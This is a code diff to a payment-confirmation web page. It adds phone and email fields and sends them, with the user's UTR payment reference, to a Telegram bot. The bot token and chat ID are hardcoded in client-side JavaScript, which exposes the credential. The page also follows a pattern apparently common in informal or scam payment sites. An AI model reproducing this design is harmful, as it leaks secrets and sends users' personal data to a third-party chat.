@@ -94,6 +94,8 @@
         <div id="utrInputContainer">
             <h2>Enter 12-digit UTR After Payment</h2>
             <input id="utrInput" type="text" placeholder="Enter 12-digit UTR" maxlength="12" required>
+            <input id="phoneInput" type="text" placeholder="Enter your phone number" required>
+            <input id="emailInput" type="email" placeholder="Enter your email address" required>
             <button onclick="submitUTR()">Submit UTR</button>
         </div>
 
@@ -144,7 +146,10 @@
         // Function to handle UTR input submission
         function submitUTR() {
             const utrInput = document.getElementById('utrInput').value;
-            if (utrInput.length === 12) {
+            const phoneInput = document.getElementById('phoneInput').value;
+            const emailInput = document.getElementById('emailInput').value;
+
+            if (utrInput.length === 12 && phoneInput && emailInput) {
                 const currentDate = new Date();
                 const dateString = currentDate.toLocaleDateString();
                 const timeString = currentDate.toLocaleTimeString();
@@ -153,22 +158,24 @@
                 localStorage.setItem('utr', utrInput);
                 localStorage.setItem('date', dateString);
                 localStorage.setItem('time', timeString);
+                localStorage.setItem('phone', phoneInput);
+                localStorage.setItem('email', emailInput);
 
-                // Send UTR to Telegram bot
-                sendUTRToTelegram(utrInput, dateString, timeString);
+                // Send UTR and details to Telegram bot
+                sendUTRToTelegram(utrInput, phoneInput, emailInput, dateString, timeString);
 
                 // Redirect to utr.html
                 window.location.href = `utr.html?utr=${encodeURIComponent(utrInput)}&date=${encodeURIComponent(dateString)}&time=${encodeURIComponent(timeString)}`;
             } else {
-                alert('Please enter a valid 12-digit UTR.');
+                alert('Please enter valid UTR, phone number, and email address.');
             }
         }
 
-        // Function to send UTR to Telegram bot
-        function sendUTRToTelegram(utr, date, time) {
+        // Function to send UTR and details to Telegram bot
+        function sendUTRToTelegram(utr, phone, email, date, time) {
             const botToken = '7491552537:AAHsUdmIYuWmzeXHgBa_hQ6nMcK3vsi0b1M'; // Replace with your bot token
             const chatId = '-4576760410'; // Replace with your chat ID
-            const message = `UTR: ${utr}\nDate: ${date}\nTime: ${time}`;
+            const message = `UTR: ${utr}\nPhone: ${phone}\nEmail: ${email}\nDate: ${date}\nTime: ${time}`;
 
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
             const payload = {
@@ -184,7 +191,7 @@
                 body: JSON.stringify(payload)
             })
             .then(response => response.json())
-            .then(data => console.log('UTR sent:', data))
+            .then(data => console.log('Details sent:', data))
             .catch(error => console.error('Error:', error));
         }
     </script>
